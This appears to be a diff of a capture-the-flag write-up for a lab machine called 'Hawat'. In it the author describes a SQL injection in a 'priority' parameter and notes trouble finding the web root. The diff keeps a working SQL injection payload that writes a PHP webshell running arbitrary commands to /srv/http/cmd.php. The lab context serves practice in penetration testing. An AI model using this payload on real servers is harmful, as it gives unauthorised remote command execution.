@@ -1,4 +1,8 @@
-# Hawat (Broken)
+---
+description: Broken for me.
+---
+
+# Hawat
 
 ## Gaining Access
 
@@ -186,14 +190,16 @@ Parameter: priority (GET)
 ---
 ```
 
-Normally, this should be rather easy to write a webshell, but I don't know the document root, and `sqlmap` brute force doesn't seem to work.&#x20;
-
-I reset the machine and took another look at port 30445, since that's the only port which doesn't seem to work properly. However, it still doesn't return any results. I took a hint and it turns out it was supposed to load `phpinfo.php`, and it shows that `/srv/http` is the document root.
-
-Anyways, with this we can write a webshell using this payload:
+Normally, this should be rather easy to write a webshell using a payload like this:
 
 ```sql
 ' union select '<?php system($_REQUEST['cmd']); ?>' into outfile '/srv/http/cmd.php' -- -
 ```
 
-However, since the webshell is written to the service on port 30445, I am unable to access it for now. &#x20;
+However I don't know the document root, and `sqlmap` brute force doesn't seem to work. I took a hint and realised that port 30445 was supposed to host `phpinfo.php`, but it was unresponsive.&#x20;
+
+I read the walkthrough and it shows that `/srv/http` is the document root taken from `phpinfo.php`, which would allow me to write a webshell to port 30445.
+
+Here's a link to the supposed solution:
+
+{% embed url="https://bing0o.github.io/posts/pg-hawat/" %}
